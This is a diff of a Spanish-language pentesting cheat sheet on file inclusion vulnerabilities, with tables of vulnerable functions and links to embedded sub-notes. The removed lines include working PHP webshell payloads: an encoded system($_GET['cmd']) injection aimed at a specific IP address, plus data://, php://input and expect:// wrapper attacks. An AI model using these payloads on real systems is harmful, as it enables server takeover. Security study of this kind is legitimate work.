@@ -1,71 +1,65 @@
 ---
 aliases:
-  - "LFI2RCE"
-  - "LFI to RCE"
+  - LFI2RCE
+  - LFI to RCE
 tags:
   - type/vulnerability
   - vuln/lfi
   - technique/execution
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación]]'
 tertiary categories:
-  - "[[Web Explotación]]"
+  - '[[Web Explotación]]'
 kind: CheatSheet
 linked:
-  - "[[LFI - Básico]]"
-  - "[[LFI - Path Traversal y Bypass de Filtros]]"
-  - "[[LFI - Null Byte Injection]]"
-  - "[[LFI - PHP Wrappers]]"
-  - "[[LFI To RCE - Log Poisoning]]"
-  - "[[LFI To RCE - proc self environ]]"
-  - "[[LFI To RCE - Session File Poisoning]]"
-  - "[[LFI To RCE - File Upload + LFI]]"
-  - "[[LFI To RCE - PHP Filter Chains]]"
-  - "[[LFI To RCE - Phar Deserialization]]"
+  - '[[LFI - Básico]]'
+  - '[[LFI - Path Traversal y Bypass de Filtros]]'
+  - '[[LFI - Null Byte Injection]]'
+  - '[[LFI - PHP Wrappers]]'
+  - '[[LFI To RCE - Log Poisoning]]'
+  - '[[LFI To RCE - proc self environ]]'
+  - '[[LFI To RCE - Session File Poisoning]]'
+  - '[[LFI To RCE - File Upload + LFI]]'
+  - '[[LFI To RCE - PHP Filter Chains]]'
+  - '[[LFI To RCE - Phar Deserialization]]'
+  - '[[Remote File Inclusion (RFI)]]'
 ---
-# File Inclusion 
+# File Inclusion
 
 ***
 
 ## Cheatsheet
 
-### Vectores de Entrada (Básicos)
+### 1. Lectura básica (LFI)
 
 ````tabs
-tab: **Básico** 
+tab: **Path Traversal básico**
 ![[LFI - Básico#^lfi-basico]]
 
-tab: **Remoto**
-![[RFI - Remote File Inclusion#^lfi-remote]]
-````
-
-### Técnicas de Evasión (Bypassing)
-
-````tabs
-tab: **Path Traversal** 
+tab: **Bypass de filtros (encoding, traversal alt)**
 ![[LFI - Path Traversal y Bypass de Filtros#^lfi-traversal]]
 
-tab: **Null Byte**
+tab: **Null Byte (legacy <PHP 5.3)**
 ![[LFI - Null Byte Injection#^lfi-nullbyte]]
 ````
 
-### Abuso de Protocolos/Streams (Wrappers)
+### 2. PHP Wrappers (lectura + ejecución)
 
 ````tabs
-tab: **Wrappers** 
+tab: **Wrappers estándar (php://filter, data, input, expect)**
 ![[LFI - PHP Wrappers#^lfi-wrappers]]
 
-tab: **Filter Chain**
+tab: **PHP Filter Chains (RCE sin upload)**
 ![[LFI To RCE - PHP Filter Chains#^lfi-phpfilter]]
 ````
 
-### Envenenamiento de Archivos (Poisoning para RCE)
+### 3. LFI to RCE — Poisoning
 
 ````tabs
-tab: **Log Poisoning** 
+tab: **Log Poisoning**
 ![[LFI To RCE - Log Poisoning#^lfi-logpoisoning]]
 
 tab: **Session File Poisoning**
@@ -75,155 +69,76 @@ tab: **/proc/self/environ**
 ![[LFI To RCE - proc self environ#^lfi-environ]]
 ````
 
-### Vectores Combinados y Lógica
+### 4. LFI to RCE — Upload combos
 
 ````tabs
-tab: **File Upload + LFI** 
+tab: **File Upload + LFI**
 ![[LFI To RCE - File Upload + LFI#^lfi-fileupload]]
 
 tab: **Phar Deserialization**
 ![[LFI To RCE - Phar Deserialization#^lfi-deserialization]]
 ````
 
-
 ***
 
 ## Overview
 
+**File Inclusion** = la app pasa un parámetro user-controlled a una función que abre/incluye un archivo. Dos variantes:
 
-***
+- **LFI (Local File Inclusion)** — leer archivos del filesystem del backend.
+- **RFI (Remote File Inclusion)** — incluir archivo desde URL controlada por el atacante → RCE directo. Ver [[Remote File Inclusion (RFI)]].
 
-## Notas Relacionadas
+### Funciones vulnerables por lenguaje
 
+| Lenguaje | Función | Lee | Ejecuta | URL Remota |
+| -------- | ------- | --- | ------- | ---------- |
+| PHP | `include()` / `include_once()` | ✅ | ✅ | ✅ (con `allow_url_include`) |
+| PHP | `require()` / `require_once()` | ✅ | ✅ | ✅ |
+| PHP | `file_get_contents()` | ✅ | ❌ | ✅ |
+| PHP | `fopen()` / `file()` / `readfile()` | ✅ | ❌ | ❌ |
+| Node.js | `fs.readFile()` / `fs.sendFile()` | ✅ | ❌ | ❌ |
+| Node.js | `res.render()` | ✅ | ✅ | ❌ |
+| Java | `<jsp:include>` / `import` | ✅ | ✅ | ✅ (import) |
+| .NET | `@Html.Partial()` / `Response.WriteFile()` | ✅ | ❌ | ❌ |
+| .NET | `<!--#include file-->` (SSI) | ✅ | ✅ | ✅ |
 
-***
-
-
-
-
-
----
-
-```
-http://154.57.164.74:31158/index.php?language=%3C%3Fphp%20system(%24_GET[%22cmd%22])%3B%3F%3E
-%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
-```
-
----
-
-## Funciones vulnerables por lenguaje
-
-| Lenguaje | Función                         | Lee | Ejecuta | URL Remota |
-| -------- | ------------------------------- | --- | ------- | ---------- |
-| PHP      | `include()` / `include_once()`  | ✅   | ✅       | ✅          |
-| PHP      | `require()` / `require_once()`  | ✅   | ✅       | ❌          |
-| PHP      | `file_get_contents()`           | ✅   | ❌       | ✅          |
-| PHP      | `fopen()` / `file()`            | ✅   | ❌       | ❌          |
-| NodeJS   | `fs.readFile()`                 | ✅   | ❌       | ❌          |
-| NodeJS   | `fs.sendFile()`                 | ✅   | ❌       | ❌          |
-| NodeJS   | `res.render()`                  | ✅   | ✅       | ❌          |
-| Java     | `include`                       | ✅   | ❌       | ❌          |
-| Java     | `import`                        | ✅   | ✅       | ✅          |
-| .NET     | `@Html.Partial()`               | ✅   | ❌       | ❌          |
-| .NET     | `@Html.RemotePartial()`         | ✅   | ❌       | ✅          |
-| .NET     | `Response.WriteFile()`          | ✅   | ❌       | ❌          |
-| .NET     | `<!--#include file-->`        | ✅   | ✅       | ✅          |
-
----
-
-## Conceptos clave
-
-> [!info] LFI — Local File Inclusion
-> Manipular parámetros para leer archivos locales del servidor.
-> Ejemplo: `?page=../../etc/passwd`
-
-> [!warning] RFI — Remote File Inclusion
-> Cargar archivos desde URLs externas. Solo posible con funciones que soporten URL remota.
-
-> [!tip] Impacto: solo lectura
-> Filtración de código fuente, credenciales, claves de DB, archivos de configuración.
-
-> [!danger] Impacto: ejecución
-> RCE completo → compromiso total del servidor backend y servidores conectados.
-
----
-
-## Patrón típico de entrada vulnerable
+### Patrones típicos
 
 ```php
-// PHP
+// PHP vulnerable
 include($_GET['language']);
+include($_GET['page'] . '.php');  // append .php — usar %00 (PHP <5.3) o ?
 ```
 
 ```javascript
-// NodeJS
-fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
-    res.write(data);
-});
+// Node.js vulnerable
+fs.readFile(path.join(__dirname, req.query.file), (err, data) => res.write(data));
 ```
 
 ```jsp
-<!-- Java -->
+<!-- Java JSP -->
 <jsp:include file="<%= request.getParameter('language') %>" />
 ```
 
 ```csharp
 // .NET
-Response.WriteFile(HttpContext.Request.Query['language']);
+Response.WriteFile(HttpContext.Request.Query['file']);
 ```
 
----
+### Dónde buscar
 
-## Dónde buscar LFI
+Parámetros sospechosos: `page`, `file`, `language`, `lang`, `view`, `template`, `include`, `path`, `doc`, `folder`, `pg`, `style`, `pdf`, `document`, `name`.
 
-- Parámetros de URL: `?page=`, `?language=`, `?file=`, `?view=`, `?template=`
-- Templating engines que cargan contenido dinámico
-- Funciones que toman paths desde input del usuario sin sanitizar
+### Read vs Execute
 
----
+- **Solo lee** → source code, credentials, configs (`.env`, `wp-config.php`), claves SSH.
+- **Ejecuta + lee local** → LFI to RCE via wrappers/log poisoning/upload chains.
+- **Ejecuta + URL remota** → RFI puro = RCE directo.
 
-## Read vs Execute — Resumen rápido
+### Recursos
 
-> [!abstract] Regla general
-> - **Solo lee** → podés extraer source code, credenciales, configs
-> - **Ejecuta** → podés lograr RCE si controlás el contenido del archivo incluido
-> - **URL remota** → abre la puerta a RFI (incluir tu propio archivo malicioso desde tu server)
+- [PortSwigger - Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
+- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+- [HackTricks - LFI / RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 
-
----
-
-# Wrappers
-
-| **Wrapper**    | **Requisito**                                               | **Sintaxis / Payload**                                       | **Método HTTP**         | **Ejemplo**                                                                                          |
-| -------------- | ----------------------------------------------------------- | ------------------------------------------------------------ | ----------------------- | ---------------------------------------------------------------------------------------------------- |
-| `php://filter` | Ninguno (lectura)                                           | `php://filter/read=convert.base64-encode/resource=<archivo>` | GET                     | `?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini` |
-| `data://`      | `allow_url_include=On`                                      | `data://text/plain;base64,<PHP_b64>` + `&cmd=<cmd>`          | GET                     | `?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`       |
-| `php://input`  | `allow_url_include=On`, parámetro acepta POST               | `php://input` con webshell en el body                        | POST (body) + GET (cmd) | `curl -X POST --data '<?php system($_GET["cmd"]); ?>' "...?language=php://input&cmd=id"`             |
-| `expect://`    | Extensión `expect` instalada y cargada (`extension=expect`) | `expect://<comando>`                                         | GET                     | `?language=expect://id`                                                                              |
-
-**Verificaciones previas (vía LFI con `php://filter`)**
-
-| Qué chequear | Comando |
-|---|---|
-| Leer `php.ini` (Apache) | `/etc/php/X.Y/apache2/php.ini` |
-| Leer `php.ini` (Nginx/FPM) | `/etc/php/X.Y/fpm/php.ini` |
-| Confirmar `allow_url_include` | `… \| base64 -d \| grep allow_url_include` |
-| Confirmar `expect` | `… \| base64 -d \| grep expect` |
-
-**Webshell base para `data://` / `input`**
-
-```bash
-echo '<?php system($_GET["cmd"]); ?>' | base64
-# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
-```
-
-**Notas clave**
-- `allow_url_include` está **off por defecto** — sin él, `data://` y `php://input` no funcionan (y tampoco RFI).
-- `php://input` requiere que el parámetro vulnerable acepte POST; si solo acepta GET, no sirve.
-- Si la función usa solo `$_POST` (no `$_REQUEST`), meté el comando hardcodeado en el PHP: `<?php system('id'); ?>` en vez de webshell dinámica.
-- `expect://` está cargado en config ≠ funcional en runtime — siempre testealo con un `id`.
-- URL-encodear el payload base64: = → `%3D`, `+` → `%2B`.
-
-___
-
-`python3 -c 'import urllib.parse;print(urllib.parse.quote_plus("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'`
+***
